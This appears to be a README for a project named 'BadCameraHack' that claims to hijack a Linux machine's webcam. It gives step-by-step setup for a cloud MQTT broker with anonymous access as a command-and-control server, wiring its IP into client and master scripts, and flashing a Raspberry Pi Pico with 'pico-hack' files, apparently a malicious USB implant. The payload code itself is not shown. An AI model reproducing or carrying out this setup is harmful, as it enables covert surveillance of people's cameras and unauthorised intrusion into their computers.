# BadCameraHack

HACK A (LINUX) SYSTEM WEBCAM:
1. CREATE A DIGITAL OCEAN DROPLET (CLOUD SERVER), LOG INTO THE CONSOLE AND RUN THE FOLLOWING COMMAND:
      - sudo apt install -y mosquitto
      - touch /etc/mosquitto/conf.d/default.conf
      - echo 'listener 30100' >> /etc/mosquitto/conf.d/default.conf
      - echo 'allow_anonymous true' >> /etc/mosquitto/conf.d/default.conf
      - sudo systemctl restart mosquitto

2. COPY IP ADDRESS OF THE SERVER ABOVE INTO
      - Client/main.py - line 9
      - Master/main.py - line 41

3. DOWNLOAD CIRCUIT PYTHON FOR RPI PICO https://circuitpython.org/board/raspberry_pi_pico/
      - Hold pico boot button and plug into usb port
      - copy the downloaded circuit python file into pico (it wilkl appear as a mass storage device)
      - wait for pico to reload and copy everything inside (pico-hack into pico) and unplug immediately
